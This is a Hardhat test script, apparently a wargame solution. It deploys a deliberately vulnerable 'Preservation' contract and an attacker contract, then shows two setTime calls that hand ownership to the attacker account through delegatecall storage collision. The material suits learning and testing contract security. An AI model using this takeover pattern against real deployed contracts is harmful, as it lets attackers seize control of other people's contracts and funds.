const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

describe("TimeZone", function () {
  let preservation, library1, library2, attacker, owner, attackerAccount;

  before(async function () {
    [owner, attackerAccount] = await ethers.getSigners();

    const LibraryContract = await ethers.getContractFactory("LibraryContract");
    library1 = await LibraryContract.deploy();
    await library1.deployed();
    
    library2 = await LibraryContract.deploy();
    await library2.deployed();

    const Preservation = await ethers.getContractFactory("Preservation");
    preservation = await Preservation.deploy(library1.address, library2.address);
    await preservation.deployed();

    const PreservationAttacker = await ethers.getContractFactory("PreservationAttacker");
    attacker = await PreservationAttacker.deploy();
    await attacker.deployed();
  });

  it("hack", async function () {
    await preservation.connect(owner).setTime(attacker.address);
    
    await attacker.connect(attackerAccount).setTime(attackerAccount.address);
    
    expect(await preservation.owner()).to.equal(attackerAccount.address);
  });
});